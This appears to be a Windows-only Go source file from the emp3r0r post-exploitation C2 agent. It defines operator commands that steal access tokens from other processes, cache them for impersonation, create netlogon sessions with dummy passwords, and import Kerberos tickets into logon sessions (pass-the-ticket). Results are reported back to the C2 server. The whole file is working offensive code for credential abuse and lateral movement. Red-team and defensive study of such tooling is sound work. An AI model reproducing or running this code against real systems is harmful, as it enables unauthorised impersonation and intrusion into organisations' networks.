//go:build windows

package handler

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"github.com/spf13/cobra"
	"golang.org/x/sys/windows"
)

func platformCommands(cmd *cobra.Command) {
	// !steal_token
	stealTokenCmd := &cobra.Command{
		Use:     def.C2CmdStealToken,
		Short:   "Steal token from process; store in memory for future use",
		Example: fmt.Sprintf("%s --pid <pid> [--token <sid>]", def.C2CmdStealToken),
		GroupID: "windows",
		Run:     runStealToken,
	}
	stealTokenCmd.Flags().StringP("pid", "", "", "PID of the process to steal token from")
	stealTokenCmd.Flags().StringP("token", "", "", "SID of an existing cached token to impersonate before stealing")
	cmd.AddCommand(stealTokenCmd)

	// !list_tokens
	listTokensCmd := &cobra.Command{
		Use:     def.C2CmdListTokens,
		Short:   "List all cached impersonation tokens with friendly names",
		Example: def.C2CmdListTokens,
		GroupID: "windows",
		Run:     runListTokens,
	}
	cmd.AddCommand(listTokensCmd)

	// !make_token
	makeTokenCmd := &cobra.Command{
		Use:     def.C2CmdMakeToken,
		Short:   "Create a netlogon logon session for a user (dummy password OK); run BOFs/starlark modules under it and import Kerberos tickets into it",
		Example: fmt.Sprintf("%s --user jdoe --domain corp.local --password dummy --name jdoe", def.C2CmdMakeToken),
		GroupID: "windows",
		Run:     runMakeToken,
	}
	makeTokenCmd.Flags().StringP("user", "", "", "Username, optionally DOMAIN\\user")
	makeTokenCmd.Flags().StringP("domain", "", "", "Domain (default: machine domain; '.' for local account)")
	makeTokenCmd.Flags().StringP("password", "", "", "Password; any dummy value works for a netlogon session")
	makeTokenCmd.Flags().StringP("name", "", "", "Session name (default: DOMAIN\\user); usable via the token option")
	cmd.AddCommand(makeTokenCmd)

	// !list_sessions
	listSessionsCmd := &cobra.Command{
		Use:     def.C2CmdListSessions,
		Short:   "List all make_token netlogon logon sessions",
		Example: def.C2CmdListSessions,
		GroupID: "windows",
		Run:     runListSessions,
	}
	cmd.AddCommand(listSessionsCmd)

	// !import_ticket
	importTicketCmd := &cobra.Command{
		Use:     def.C2CmdImportTicket,
		Short:   "Import a base64 KRB-CRED (.kirbi) ticket into a make_token session's logon session (or an explicit LUID)",
		Example: fmt.Sprintf("%s --session jdoe --ticket doIF8DCCBey...", def.C2CmdImportTicket),
		GroupID: "windows",
		Run:     runImportTicket,
	}
	importTicketCmd.Flags().StringP("session", "", "", "Name of a make_token session to import the ticket into")
	importTicketCmd.Flags().StringP("luid", "", "", "Explicit logon session LUID (hex, eg. 3ea8); requires SYSTEM for other users' sessions")
	importTicketCmd.Flags().StringP("ticket", "", "", "Base64-encoded KRB-CRED (.kirbi) ticket")
	cmd.AddCommand(importTicketCmd)
}

func runStealToken(cmd *cobra.Command, args []string) {
	pidStr, _ := cmd.Flags().GetString("pid")
	if pidStr == "" {
		c2transport.NotifyC2(cmd, "Error: args error: PID is required: %s", args)
		return
	}
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: args error: PID is invalid: %s", args)
		return
	}

	// If an existing token SID is provided, pass its handle to StealToken
	// so it can impersonate before opening the target process.
	tokenSID, _ := cmd.Flags().GetString("token")
	var hExisting windows.Handle
	if tokenSID != "" {
		raw, ok := priv.TokenMap.Load(tokenSID)
		if !ok {
			c2transport.NotifyC2(cmd, "Error: token not found for SID %q", tokenSID)
			return
		}
		var ok2 bool
		hExisting, ok2 = raw.(windows.Handle)
		if !ok2 {
			c2transport.NotifyC2(cmd, "Error: invalid token handle for SID %q", tokenSID)
			return
		}
	}

	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid), hExisting)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	sid, err := priv.GetTokenUserSid(hToken)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	priv.TokenMap.Store(sid, hToken)
	friendly := priv.GetTokenFriendlyName(hToken)
	c2transport.NotifyC2(cmd, "Successfully stole token for %s", friendly)
}

func runListTokens(cmd *cobra.Command, _ []string) {
	var entries []string
	priv.TokenMap.Range(func(key, value any) bool {
		sid, ok := key.(string)
		if !ok {
			return true
		}
		hToken, ok := value.(windows.Handle)
		if !ok {
			entries = append(entries, fmt.Sprintf("%s  <invalid handle>", sid))
			return true
		}
		friendly := priv.GetTokenFriendlyName(hToken)
		// make_token sessions are stored in TokenMap under their session name
		// so they can be used via the universal "token" option; annotate them.
		if _, isSession := priv.GetSession(sid); isSession {
			friendly += "  [make_token session]"
		}
		// Output key first so the CC-side completer can use it directly
		entries = append(entries, fmt.Sprintf("%s  %s", sid, friendly))
		return true
	})

	if len(entries) == 0 {
		c2transport.NotifyC2(cmd, "No cached tokens (run: %s --pid <PID> or %s --user <USER>)\n", "!steal_token", "!make_token")
		return
	}
	c2transport.NotifyC2(cmd, "Cached tokens (%d):\n%s\n", len(entries), strings.Join(entries, "\n"))
}

// runMakeToken implements !make_token --user <user> [--domain <domain>]
// [--password <dummy>] [--name <session>]
func runMakeToken(cmd *cobra.Command, args []string) {
	user, _ := cmd.Flags().GetString("user")
	domain, _ := cmd.Flags().GetString("domain")
	password, _ := cmd.Flags().GetString("password")
	sessionName, _ := cmd.Flags().GetString("name")

	user = strings.TrimSpace(user)
	domain = strings.TrimSpace(domain)
	if user == "" {
		c2transport.NotifyC2(cmd, "Error: args error: --user is required: %s", args)
		return
	}

	// Accept DOMAIN\user in --user when --domain is not given.
	if domain == "" {
		if i := strings.Index(user, "\\"); i != -1 {
			domain = user[:i]
			user = user[i+1:]
		} else {
			domain = "" // MakeToken defaults to "." (local)
		}
	}

	session, err := priv.MakeToken(user, domain, password)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}

	if sessionName == "" {
		sessionName = priv.DefaultSessionName(session)
	}
	priv.StoreSession(sessionName, session)
	priv.RegisterSessionToken(session)

	friendly := priv.GetTokenFriendlyName(windows.Handle(session.Token))
	c2transport.NotifyC2(cmd,
		"Successfully created netlogon logon session for %s\n"+
			"  session name : %s (usable via the token option of any BOF/starlark module)\n"+
			"  logon LUID   : 0x%08x (for kerbeus ptt /luid:)\n"+
			"  next step    : %s --session %s --ticket <base64 kirbi> to import a ticket",
		friendly, sessionName, session.LogonID, "!import_ticket", sessionName)
}

// runListSessions implements !list_sessions
func runListSessions(cmd *cobra.Command, _ []string) {
	entries := priv.ListSessions()
	if len(entries) == 0 {
		c2transport.NotifyC2(cmd, "No netlogon sessions (run: %s --user <USER>)\n", "!make_token")
		return
	}
	c2transport.NotifyC2(cmd, "Netlogon sessions (%d):\n%s\n", len(entries), strings.Join(entries, "\n"))
}

// runImportTicket implements
// !import_ticket --session <name> --ticket <base64> | --luid <hex> --ticket <base64>
func runImportTicket(cmd *cobra.Command, args []string) {
	sessionName, _ := cmd.Flags().GetString("session")
	luidStr, _ := cmd.Flags().GetString("luid")
	ticketB64, _ := cmd.Flags().GetString("ticket")

	ticketB64 = strings.TrimSpace(ticketB64)
	if ticketB64 == "" {
		c2transport.NotifyC2(cmd, "Error: args error: --ticket (base64 KRB-CRED) is required: %s", args)
		return
	}
	sessionName = strings.TrimSpace(sessionName)
	luidStr = strings.TrimSpace(luidStr)
	if sessionName == "" && luidStr == "" {
		c2transport.NotifyC2(cmd, "Error: args error: specify --session <name> or --luid <hex>")
		return
	}
	if sessionName != "" && luidStr != "" {
		c2transport.NotifyC2(cmd, "Error: args error: --session and --luid are mutually exclusive")
		return
	}

	if sessionName != "" {
		session, ok := priv.GetSession(sessionName)
		if !ok {
			c2transport.NotifyC2(cmd, "Error: session %q not found – create it with %s", sessionName, "!make_token")
			return
		}
		if err := priv.ImportTicketBase64(session, ticketB64); err != nil {
			c2transport.NotifyC2(cmd, "Error importing ticket into session %q: %v", sessionName, err)
			return
		}
		c2transport.NotifyC2(cmd, "Ticket imported into session %q (luid=0x%08x). Run BOFs/starlark modules with --token %s to use it.",
			sessionName, session.LogonID, sessionName)
		return
	}

	// Explicit LUID path (requires SYSTEM for other users' sessions)
	luidVal, err := strconv.ParseUint(luidStr, 16, 64)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: args error: invalid --luid %q (expected hex, eg. 3ea8): %v", luidStr, err)
		return
	}
	if err := priv.ImportTicketToLUIDBase64(windows.LUID{
		LowPart:  uint32(luidVal & 0xffffffff),
		HighPart: int32(luidVal >> 32),
	}, ticketB64); err != nil {
		c2transport.NotifyC2(cmd, "Error importing ticket into luid 0x%08x: %v", luidVal, err)
		return
	}
	c2transport.NotifyC2(cmd, "Ticket imported into luid 0x%08x", luidVal)
}
